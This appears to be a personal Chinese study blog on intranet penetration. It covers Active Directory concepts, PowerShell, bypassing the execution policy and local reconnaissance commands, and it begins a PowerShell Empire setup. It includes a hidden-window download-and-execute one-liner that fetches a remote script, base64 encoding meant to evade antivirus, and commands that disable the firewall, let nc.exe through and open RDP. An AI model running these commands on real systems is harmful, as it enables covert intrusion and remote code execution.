<p><img src="https://i.loli.net/2021/07/06/jAdtFibEVLv2Dnf.png" alt="image-20210706100638761"></p>
<p>工作组中的计算机是平等的，也被称为对等网站，而对管理者而言，工作组的管理方式有时不太方便，这时候就要学习域的概念了</p>
<h3 id="域domain"><a href="#域domain" class="headerlink" title="域domain"></a>域<code>domain</code></h3><p>是一个有安全边界的计算机集合（安全边界就是在两个域中，一个域中的用户无法访问另一个域中的）</p>
<p>可以简单理解为工作组的升级版，域的安全管理机制更加严格，获取什么样权限的资源必须要先登录到域，而且还取决于用户在域中的身份</p>
<h4 id="域控制器-DC"><a href="#域控制器-DC" class="headerlink" title="域控制器 DC"></a>域控制器<code> DC</code></h4><p><code>domain controller</code>至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器</p>
<p>域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库</p>
<blockquote>
<p>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源</p>
</blockquote>
<p>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码</p>
<p>内网中的一台主机+安装活动目录=域控</p>
<blockquote>
<p>在域中除了域控制器还有成员服务器、客户机、独立服务器</p>
</blockquote>
<h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>顾名思义，一个域下新建的域就是子域，而这个大的域则是父域</p>
<p>每个域中都有独立的安全策略</p>
<h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>是多个域通过建立信任关系组成的集合，活动目录包含一个或多个域树</p>
<p>域树中的域层次越深级别越低，一个“.”代表一个层次</p>
<blockquote>
<p>如域child.Microsoft.com 就比 Microsoft.com这个域级别低</p>
<p>而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低</p>
</blockquote>
<p>多个域树可以组成一个域林</p>
<h4 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h4><p>是指由一个或多个没有形成连续名字空间的域树组成</p>
<p>与域树之间的区别：</p>
<blockquote>
<p>最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成</p>
</blockquote>
<p>域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系</p>
<h4 id="域名服务器DNS"><a href="#域名服务器DNS" class="headerlink" title="域名服务器DNS"></a>域名服务器<code>DNS</code></h4><p>是指用于实现域名和与之相对应的ip地址转换的服务器</p>
<p>在内网渗透测试中，大部分是通过寻找dns服务器来确定域控的位置（dns服务器和域控通常配置在同一台机器上）</p>
<h3 id="活动目录-AD"><a href="#活动目录-AD" class="headerlink" title="活动目录  AD"></a>活动目录 <code> AD</code></h3><p><code>Active Directory</code></p>
<p>是指域环境中提供目录服务的组件</p>
<blockquote>
<p>是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中</p>
</blockquote>
<p>如果将内网看做一本字典，那么内网里的资源就是字典的内容，而活动目录相当于字典的索引，活动目录存储的是网络中所有资源的快捷方式，使用活动目录用户就可以通过寻找快捷方式来定位资源</p>
<h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h3><p><code>demilitarized zone</code>也就是隔离区</p>
<p>DMZ位于内网和外网之间，通常放置一些必须公开但不含机密信息的公开的服务器设施，如web服务器、email服务器、ftp服务器</p>
<p>一般情况下，DMZ不能访问内网和外网，而内网和外网均能访问DMZ，为了保护内网和完成正常的业务</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/lvTqB4HLwG0PkL4jIMkLOpawzxrDO0F2Malg9Ona0DWktgtclPWx3NGRWChnFNgBzfKcwucgLAPdIkE5ZVmBIQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h3 id="域内权限"><a href="#域内权限" class="headerlink" title="域内权限"></a>域内权限</h3><p>学习一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行</p>
<p>常见的组有：域本地组、全局组、通用组</p>
<h4 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h4><p>主要用于授予本域内资源的访问权限</p>
<p>成员范围：所有的域；使用范围：自己所在的域</p>
<h4 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h4><p>只能在创建它的域中添加用户和组，不能添加到不同域的全局组中</p>
<p>成员范围：自己所在的域；使用范围：所有的域</p>
<h4 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h4><p>成员范围：所有的域；使用范围：所有的域</p>
<blockquote>
<p>可以这样简单记忆：域本地组来自全林，作用于本域；全局组来自本域，作用于全林；通用组来自全林，作用于全林</p>
</blockquote>
<h4 id="AG-D-L-P策略"><a href="#AG-D-L-P策略" class="headerlink" title="AG-D-L-P策略"></a>AG-D-L-P策略</h4><p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限</p>
<ul>
<li>A 表示用户账号<code>account</code></li>
<li>G 表示全局组<code>global</code></li>
<li>U 表示通用组<code>universal</code></li>
<li>DL 表示域本地组<code>domain local</code></li>
<li>P 表示资源权限<code>permission</code></li>
</ul>
<h2 id="二、powershell"><a href="#二、powershell" class="headerlink" title="二、powershell"></a>二、powershell</h2><h3 id="什么是powershell"><a href="#什么是powershell" class="headerlink" title="什么是powershell"></a>什么是powershell</h3><p>PowerShell 是一种跨平台的任务自动化解决方案，由命令行 shell、脚本语言和配置管理框架组成。 PowerShell 在 Windows、Linux 和 macOS 上运行</p>
<p>Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework 的强大功能</p>
<h3 id="powershell的特点"><a href="#powershell的特点" class="headerlink" title="powershell的特点"></a>powershell的特点</h3><ul>
<li>Windows 7 以上的操作系统默认安装</li>
<li>PowerShell 脚本可以运行在内存中，不需要写入磁盘</li>
<li>可以从另一个系统中下载 PowerShell 脚本并执行</li>
<li>目前很多工具都是基于 PowerShell 开发的</li>
<li>很多安全软件检测不到 PowerShell 的活动</li>
<li>cmd 通常会被阻止运行，但是 PowerShell 不会</li>
<li>可以用来管理活动目录</li>
<li>PowerShell 是一种跨平台的任务自动化解决方案，由命令行 shell、脚本语言和配置管理框架组成。 PowerShell 在 Windows、Linux 和 macOS 上运行</li>
</ul>
<h3 id="Windows-操作系统对应的-PowerShell-版本信息"><a href="#Windows-操作系统对应的-PowerShell-版本信息" class="headerlink" title="Windows 操作系统对应的 PowerShell 版本信息"></a>Windows 操作系统对应的 PowerShell 版本信息</h3><p>1.0     windows server 2008</p>
<p>2.0     windows server 2008 r2、windows 7</p>
<p>3.0     windows server 2012、windows 8</p>
<p>4.0     windows server 2012 r2、windows 8.1</p>
<p>5.0     windows 10</p>
<p>5.1     windows server 2016</p>
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="ps1-文件"><a href="#ps1-文件" class="headerlink" title="ps1 文件"></a>ps1 文件</h4><p>ps1 是PowerShell 的脚本扩展名，一个 PowerShell 脚本文件其实就是一个简单的文本文件</p>
<h4 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h4><p>为了防止恶意脚本在 PowerShell 中被运行，PowerShell 有个执行策略，默认情况下，这个执行策略是受限模式<code>Restricted</code>（即不能运行）</p>
<p>查询当前执行策略<code>get-executionpolicy</code></p>
<p><img src="https://i.loli.net/2021/07/06/kEcVy4WYgD6df1a.png" alt="image-20210706204210412"></p>
<h5 id="执行策略的种类"><a href="#执行策略的种类" class="headerlink" title="执行策略的种类"></a>执行策略的种类</h5><blockquote>
<p><strong>Restricted</strong>：不能运行脚本</p>
<p><strong>RemoteSigned</strong>：本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）</p>
<p><strong>AllSigned</strong>：仅当脚本由受信任的发布者签名才能运行。</p>
<p><strong>Unrestricted</strong>：脚本执行不受限制，不管来自哪里，也不管它们是否有签名</p>
</blockquote>
<h5 id="设置执行策略"><a href="#设置执行策略" class="headerlink" title="设置执行策略"></a>设置执行策略</h5><p><code>set-executionpolicy 执行策略</code></p>
<h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p> 输入完整路径或是直接到脚本文件所在目录下使用<code>.\ xxx.ps1</code></p>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>同linux中的管道，就是将管道符<code>|</code>前一个命令的输出作为后一个命令的输入</p>
<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><h4 id="获取版本号"><a href="#获取版本号" class="headerlink" title="获取版本号"></a>获取版本号</h4><p><code>get-host</code></p>
<p><img src="https://i.loli.net/2021/07/06/hafSoB1Z4sVj65E.png" alt="image-20210706203505337"></p>
<p><code>$psversiontable</code></p>
<p><img src="https://i.loli.net/2021/07/06/AJqisPd9ouYx4jX.png" alt="image-20210706203518099"></p>
<h4 id="文件操作命令"><a href="#文件操作命令" class="headerlink" title="文件操作命令"></a>文件操作命令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">新建目录test：New-Item test -ItemType directory</span><br><span class="line">删除目录test：Remove-Item test</span><br><span class="line">新建文件test.txt：New-Item test.txt -ItemType file</span><br><span class="line">新建文件test.txt，内容为 hello：New-Item test.txt -ItemType file -value &quot;hello&quot;</span><br><span class="line">删除文件test.txt：Remove-Item test.txt</span><br><span class="line">查看文件test.txt内容：Get-Content  test.txt</span><br><span class="line">设置文件test.txt内容t：Set-Content  test.txt  -Value &quot;hello&quot;</span><br><span class="line">给文件test.txt追加内容：Add-Content test.txt  -Value &quot;,word!&quot;</span><br><span class="line">清除文件test.txt内容：Clear-Content test.txt</span><br></pre></td></tr></table></figure>
<p>总结一下就是</p>
<p>新建命令<code>New-Item 目录名/文件名-ItemType directory/file</code></p>
<p>删除命令<code>Remove-Item 目录名/文件名</code></p>
<p>查看文件内容<code>get-content</code></p>
<p>设置文件内容<code>Set-Content 文件名 -Value &quot;设置的内容&quot;</code></p>
<p>追加文件内容<code>Add-Content 文件名 -Value &quot;追加的内容&quot;</code></p>
<p>清除文件内容<code>clear-content 文件名</code></p>
<h3 id="策略绕过"><a href="#策略绕过" class="headerlink" title="策略绕过"></a>策略绕过</h3><p>因为默认的执行策略是<code>restricted</code>，要进行绕过，变成<code>unrestricted</code></p>
<h4 id="1-绕过本地权限并执行"><a href="#1-绕过本地权限并执行" class="headerlink" title="1.绕过本地权限并执行"></a>1.绕过本地权限并执行</h4><p>先来看一下默认受限模式下执行脚本的情况</p>
<p>查看策略<code>powershell.exe get-executionpolicy</code></p>
<p>执行脚本<code>powershell.exe -file 1.ps1</code></p>
<p><img src="https://i.loli.net/2021/07/07/e2UbgOo8KJqyGRd.png" alt="image-20210707174243905"></p>
<p>将”hello”写入<code>1.ps1</code>文件 <code> &#39;&quot;hello&quot;&#39;&gt;1.ps1</code></p>
<p>并执行<code> powershell.exe -executionpolicy bypass -file 1.ps1</code></p>
<p><img src="https://i.loli.net/2021/07/07/pAFcTBueqh74tYk.png" alt="image-20210707180201499"></p>
<h4 id="2-绕过本地权限并隐藏执行"><a href="#2-绕过本地权限并隐藏执行" class="headerlink" title="2.绕过本地权限并隐藏执行"></a>2.绕过本地权限并隐藏执行</h4><p>上一条命令<code>-executionpolicy bypass</code>之后再加上<code>-windowstyle hidden -nologo -noninteractive -noprofile</code>即可隐藏执行</p>
<p><code>powershell.exe -executionpolicy bypass -windowstyle hidden -nologo -noninteractive -noprofile -file 1.ps1</code></p>
<p>执行的话窗口会直接退出，就是隐藏执行</p>
<h5 id="下载远程脚本并隐藏执行"><a href="#下载远程脚本并隐藏执行" class="headerlink" title="下载远程脚本并隐藏执行"></a>下载远程脚本并隐藏执行</h5><p>将<code>-file 1.ps1</code>替换为<code>&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://ip/t.ps1&#39;)&quot;</code></p>
<p><code>powershell.exe -executionpolicy bypass -windowstyle hidden -nologo -noninteractive -noprofile &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://ip/t.ps1&#39;)&quot;</code></p>
<p>其中隐藏执行的代码可以简写成<code>-Exec Bypass -W Hidden -NoLogo -NonI -NoP</code></p>
<h4 id="3-使用base64对powershell命令进行编码"><a href="#3-使用base64对powershell命令进行编码" class="headerlink" title="3.使用base64对powershell命令进行编码"></a>3.使用base64对powershell命令进行编码</h4><p>使用base64对命令进行编码的目的是为了混淆代码以避免被杀毒软件查杀</p>
<p>这里使用到了<code>ps_encoder.py</code></p>
<blockquote>
<p> ps_encoder.py是使用Base64编码封装的PowerShell命令包，其目的是混淆和压缩代码</p>
</blockquote>
<p><a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py">ps_encoder.py下载地址</a></p>
<p>下载好之后，先将要执行的命令保存到文本<code>1.txt</code>中，之后执行<code>python ps_encoder.py -s 1.txt</code></p>
<p>然后使用<code>-enc</code>指定base编码内容</p>
<p><code>powershell.exe -exec bypass -enc YwBtAGQA</code></p>
<p><img src="https://i.loli.net/2021/07/07/8GrRaSbU1qdnKEw.png" alt="image-20210707222727431"></p>
<p>然后就被火绒拦截了。。</p>
<p>下星期去了解一下免杀</p>
<p><img src="https://i.loli.net/2021/07/07/gMXQodxYISUP6Rc.png" alt="image-20210707213652646"></p>
<h2 id="三、内网信息收集之本地信息收集"><a href="#三、内网信息收集之本地信息收集" class="headerlink" title="三、内网信息收集之本地信息收集"></a>三、内网信息收集之本地信息收集</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当进入内网之后，首先对网络环境进行判断，即</p>
<blockquote>
<ol>
<li><p>机器角色</p>
<blockquote>
<p>判断是web服务器、文件服务器、代理服务器、dns服务器或是其他类型，需要根据机器的主机名、文件、网络连接等综合判断</p>
</blockquote>
</li>
<li><p>所处的网络环境的拓扑结构</p>
<blockquote>
<p>就是对所处内网进行全面的数据收集和整理分析，大致了解该内网的网络拓扑</p>
</blockquote>
</li>
<li><p>当前机器所处区域</p>
<blockquote>
<p>判断机器处于网络拓扑中的哪个区域，DMZ、办公区还是核心区，也就是其所处的大概位置</p>
</blockquote>
</li>
</ol>
</blockquote>
<h3 id="一、手动收集本地信息"><a href="#一、手动收集本地信息" class="headerlink" title="一、手动收集本地信息"></a>一、手动收集本地信息</h3><h4 id="1-查询网络配置信息"><a href="#1-查询网络配置信息" class="headerlink" title="1.查询网络配置信息"></a>1.查询网络配置信息</h4><ul>
<li>查看当前权限</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/09/dQv9opMOlPDsAjC.png" alt="image-20210709161036865"></p>
<ul>
<li>查询网络配置信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br><span class="line">ifconfig </span><br></pre></td></tr></table></figure>
<h4 id="2-查询操作系统及软件信息"><a href="#2-查询操作系统及软件信息" class="headerlink" title="2.查询操作系统及软件信息"></a>2.查询操作系统及软件信息</h4><ul>
<li>查询操作系统及软件信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/09/LyYWQ6tI7OnhmoB.png" alt="image-20210709161910359"></p>
<ul>
<li>查看系统体系结构</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/09/aRJM3lPEjwdZIxG.png" alt="image-20210709162129501"></p>
<ul>
<li>查看系统所有环境变量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/09/J3yPFa4sEC5wN7r.png" alt="image-20210709162258148"></p>
<ul>
<li>查看安装的软件及版本和路径等信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/09/43T9BirLkyeS6OW.png" alt="image-20210709162935207"></p>
<ul>
<li>利用 PowerShell 收集软件版本信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/09/ONVk5FIAfqiyCGL.png" alt="image-20210709163007956"></p>
<h4 id="3-查询本机服务信息"><a href="#3-查询本机服务信息" class="headerlink" title="3.查询本机服务信息"></a>3.查询本机服务信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/07/09/sq7QixYrmUAtjEu.png" alt="image-20210709163128489"></p>
<h4 id="4-查询进程列表"><a href="#4-查询进程列表" class="headerlink" title="4.查询进程列表"></a>4.查询进程列表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tasklist &#x2F;v</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/09/mpFdPrMJDEtAo7U.png" alt="image-20210709171049226"></p>
<ul>
<li>wmic 查看进程信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/09/7bHNJPR1GSIyLZY.png" alt="image-20210709171203244"></p>
<h4 id="5-查看启动程序信息"><a href="#5-查看启动程序信息" class="headerlink" title="5.查看启动程序信息"></a>5.查看启动程序信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/09/BN17HuLR6vlE4hf.png" alt="image-20210709171349557"></p>
<h4 id="6-查看计划任务"><a href="#6-查看计划任务" class="headerlink" title="6.查看计划任务"></a>6.查看计划任务</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/07/09/cBJQhFGK9Iveb7w.png" alt="image-20210709171612992"></p>
<h4 id="7-查看主机开启时间"><a href="#7-查看主机开启时间" class="headerlink" title="7.查看主机开启时间"></a>7.查看主机开启时间</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/11/nhcQbRsfUFuE8YV.png" alt="image-20210711163948985"></p>
<h4 id="8-查询用户列表"><a href="#8-查询用户列表" class="headerlink" title="8.查询用户列表"></a>8.查询用户列表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/11/BLU76YiVRSAqDGb.png" alt="image-20210711164021432"></p>
<ul>
<li>查看指定用户的信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user xxx</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/11/DWqZ8xFv4saSQ1H.png" alt="image-20210711164129428"></p>
<ul>
<li>查看本地管理员用户</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>
<ul>
<li>查看当前在线用户</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/11/t6X4fNMBmUvWyei.png" alt="image-20210711164258577"></p>
<h4 id="9-列出或断开本地计算机和连接的客户端的会话"><a href="#9-列出或断开本地计算机和连接的客户端的会话" class="headerlink" title="9.列出或断开本地计算机和连接的客户端的会话"></a>9.列出或断开本地计算机和连接的客户端的会话</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发生系统错误 5。</span><br><span class="line"></span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>


<h4 id="10-查看端口列表"><a href="#10-查看端口列表" class="headerlink" title="10.查看端口列表"></a>10.查看端口列表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat –ano</span><br></pre></td></tr></table></figure>


<h4 id="11-查看补丁列表"><a href="#11-查看补丁列表" class="headerlink" title="11.查看补丁列表"></a>11.查看补丁列表</h4><p>查看系统的详细信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/11/SktHCqj3aZxBU72.png" alt="image-20210711164721047"></p>
<ul>
<li>使用 wmic 查看补丁列表</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/11/vAhGJC8KMRxzIl1.png" alt="image-20210711164824760"></p>
<h4 id="12-查看本机共享"><a href="#12-查看本机共享" class="headerlink" title="12.查看本机共享"></a>12.查看本机共享</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/11/aGNzef2Z1UclJWp.png" alt="image-20210711164903152"></p>
<ul>
<li>使用 wmic 查看共享列表</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure>


<h4 id="13-查询路由表及所有可用接口的ARP-缓存表"><a href="#13-查询路由表及所有可用接口的ARP-缓存表" class="headerlink" title="13.查询路由表及所有可用接口的ARP 缓存表"></a>13.查询路由表及所有可用接口的ARP 缓存表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">route printarp –a</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure>


<h4 id="14-查询防火墙相关配置"><a href="#14-查询防火墙相关配置" class="headerlink" title="14.查询防火墙相关配置"></a>14.查询防火墙相关配置</h4><ul>
<li><ul>
<li>关闭防火墙</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh firewall set opmode disable (Windows Server 2003 系统及之前版本)</span><br><span class="line">netsh advfirewall set allprofiles state off    (Windows Server 2003 系统及之后版本)</span><br></pre></td></tr></table></figure>


<ul>
<li>查看防火墙配置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/11/zsjSJCIfHVrdGOc.png" alt="image-20210711165117441"></p>
<ul>
<li><p>修改防火墙配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(Windows Server 2003 系统及之前版本)允许指定程序全部连接</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line"></span><br><span class="line">(Windows Server 2003 之后系统版本)允许指定程序连入</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;C: \nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许指定程序连出</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Allow nc&quot; dir&#x3D;out action&#x3D;allow program&#x3D;&quot;C: \nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许 3389 端口放行</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><ul>
<li>自定义防火墙日志储存位置</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log</span><br></pre></td></tr></table></figure>


<h4 id="15-查看计算机代理配置情况"><a href="#15-查看计算机代理配置情况" class="headerlink" title="15.查看计算机代理配置情况"></a>15.查看计算机代理配置情况</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure>


<h4 id="16-查询并开启远程连接服务"><a href="#16-查询并开启远程连接服务" class="headerlink" title="16.查询并开启远程连接服务"></a>16.查询并开启远程连接服务</h4><ul>
<li><ul>
<li>查看远程连接端口（0xd3d换成10进制即3389）</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;V PortNumber</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/11/Z5rDzpfyPiewu6U.png" alt="image-20210711165403629"></p>
<ul>
<li><ul>
<li>在Windows Server 2003 中开启3389 端口</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure>


<ul>
<li><ul>
<li>在Windows Server 2008 和Windows Server 2012 中开启3389 端口</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName&#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>


<h3 id="二、自动收集信息"><a href="#二、自动收集信息" class="headerlink" title="二、自动收集信息"></a>二、自动收集信息</h3><h4 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h4><p>windows管理工具命令行，在默认情况下，任何版本的XP的低权限用户不能访问wmic，win7以上的低权限用户允许访问并执行相关操作</p>
<p><a href="https://www.fuzzysecurity.com/scripts/files/wmic_info.rar">wmic 脚本下载地址</a></p>
<p>直接运行这个bat文件，会生成out.html文件</p>
<p><img src="https://i.loli.net/2021/07/11/Sw1klBxJofIATN6.png" alt="image-20210711132144653"></p>
<p><img src="https://i.loli.net/2021/07/11/soz5IyMEQe4tfhL.png" alt="image-20210711132255627"></p>
<h4 id="PowerShsell-Empire"><a href="#PowerShsell-Empire" class="headerlink" title="PowerShsell Empire"></a>PowerShsell Empire</h4><p>中文简称 “帝国”，是一款针对 Windows 系统平台而打造的渗透工具</p>
<p><a href="https://github.com/BC-SECURITY/Empire">Empire</a></p>
<p>与msf的区别是：</p>
<ul>
<li>MSF 是全平台的，无论是win，linux，mac都可以打，但 Empire 是只针对 Windows 的</li>
<li>MSF 集信息收集，渗透，后渗透，木马，社工的功能为一体，全面多能；而 Empire 专注于内网渗透，它是针对 PowerShell 的</li>
</ul>
<p>使用了<code>git clone --recursive https://github.com/BC-SECURITY/Empire.git</code>和<code>sudo apt install powershell-empire </code></p>
<p><code>wget https://raw.githubusercontent.com/backlion/demo/master/Empire-master.zip</code>都没有成功</p>
<p><img src="https://i.loli.net/2021/07/11/sNVm1C56UbzE23k.png" alt="image-20210711191031758"></p>
<p>最后还是使用docker搭建一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it -p 1337:1337 -p 5000:5000 bcsecurity&#x2F;empire</span><br></pre></td></tr></table></figure>
<h5 id="进入容器内部"><a href="#进入容器内部" class="headerlink" title="进入容器内部"></a>进入容器内部</h5><p><code>docker exec -it 容器id bash</code></p>
<h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><p><code>./empire</code></p>
<p><img src="https://i.loli.net/2021/07/11/Jx1k9gFIhOGYsQC.png" alt="image-20210711191644112"></p>
<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>查看帮助信息</p>
<p><img src="https://i.loli.net/2021/07/11/g8lvMn1sQYj9JmV.png" alt="image-20210711192600026"></p>
